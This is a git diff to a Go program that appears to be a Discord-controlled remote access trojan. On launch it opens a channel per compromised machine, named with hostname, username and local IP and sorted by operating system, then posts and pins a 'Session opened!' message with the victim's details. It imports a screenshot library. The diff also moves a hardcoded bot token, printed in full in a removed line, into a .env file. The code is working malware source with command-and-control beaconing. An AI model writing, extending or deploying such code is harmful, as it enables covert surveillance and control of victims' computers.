@@ -14,6 +14,7 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"image/png"
 	"io"
@@ -33,7 +34,53 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
-var myChannelId string // Global variable
+var myChannelId string
+var guildID string
+
+func loadEnvFile(path string) {
+	f, err := os.Open(path)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if len(line) == 0 || strings.HasPrefix(line, "#") {
+			continue
+		}
+		parts := strings.SplitN(line, "=", 2)
+		if len(parts) != 2 {
+			continue
+		}
+		key := strings.TrimSpace(parts[0])
+		value := strings.TrimSpace(parts[1])
+		if len(key) == 0 {
+			continue
+		}
+		os.Setenv(key, value)
+	}
+}
+
+func getOrCreateCategory(s *discordgo.Session, name string) (string, error) {
+	channels, err := s.GuildChannels(guildID)
+	if err != nil {
+		return "", err
+	}
+	for _, ch := range channels {
+		if ch.Type == discordgo.ChannelTypeGuildCategory && ch.Name == name {
+			return ch.ID, nil
+		}
+	}
+	cat, err := s.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
+		Name: name,
+		Type: discordgo.ChannelTypeGuildCategory,
+	})
+	if err != nil {
+		return "", err
+	}
+	return cat.ID, nil
+}
 
 func getTmpDir() string {
 	if runtime.GOOS == "windows" {
@@ -143,7 +190,13 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func main() {
-	dg, err := discordgo.New("Bot MTQ2OTc5Mzk2MTYxODA0NzEzOA.GEptn2.PLhshGct9sY4hYcxBinLanGUibG3MMRd41LkfE") // Hardcoded bot token
+	loadEnvFile(".env")
+	guildID = os.Getenv("DISCORD_GUILD_ID")
+	token := os.Getenv("DISCORD_BOT_TOKEN")
+	if token == "" || guildID == "" {
+		return
+	}
+	dg, err := discordgo.New("Bot " + token)
 	if err != nil {
 		// Error creating Discord session
 		return
@@ -162,19 +215,44 @@ func main() {
 	// Create new channel
 	rand.Seed(time.Now().UnixNano())
 	currentUser, _ := user.Current()
-	sessionId := currentUser.Username
-	c, err := dg.GuildChannelCreate("1469794897333719302", sessionId, 0) // Guild ID is hardcoded
+	hostname, _ := os.Hostname()
+	conn, _ := net.Dial("udp", "8.8.8.8:80")
+	defer conn.Close()
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	ipStr := localAddr.IP.String()
+	sessionId := fmt.Sprintf("%s | %s | %s", hostname, currentUser.Username, ipStr)
+	cwd, _ := os.Getwd()
+	var categoryName string
+	switch runtime.GOOS {
+	case "windows":
+		categoryName = "Windows"
+	case "linux":
+		categoryName = "Linux"
+	case "darwin":
+		categoryName = "Mac"
+	default:
+		categoryName = "Other"
+	}
+	categoryID, err := getOrCreateCategory(dg, categoryName)
+	if err != nil {
+		return
+	}
+	channelName := fmt.Sprintf("%s-%s-%s",
+		strings.ToLower(hostname),
+		strings.ToLower(currentUser.Username),
+		strings.ReplaceAll(ipStr, ".", "-"),
+	)
+	c, err := dg.GuildChannelCreateComplex(guildID, discordgo.GuildChannelCreateData{
+		Name:     channelName,
+		Type:     discordgo.ChannelTypeGuildText,
+		ParentID: categoryID,
+	})
 	if err != nil {
 		return
 	}
 	myChannelId = c.ID
 
 	// Send first message with basic info (and pin it)
-	hostname, _ := os.Hostname()
-	cwd, _ := os.Getwd()
-	conn, _ := net.Dial("udp", "8.8.8.8:80")
-	defer conn.Close()
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
 	firstMsg := fmt.Sprintf("Session *%s* opened! 🥳\n\n**IP**: %s\n**User**: %s\n**Hostname**: %s\n**OS**: %s\n**CWD**: %s", sessionId, localAddr.IP, currentUser.Username, hostname, runtime.GOOS, cwd)
 	m, _ := dg.ChannelMessageSend(myChannelId, firstMsg)
 	dg.ChannelMessagePin(myChannelId, m.ID)
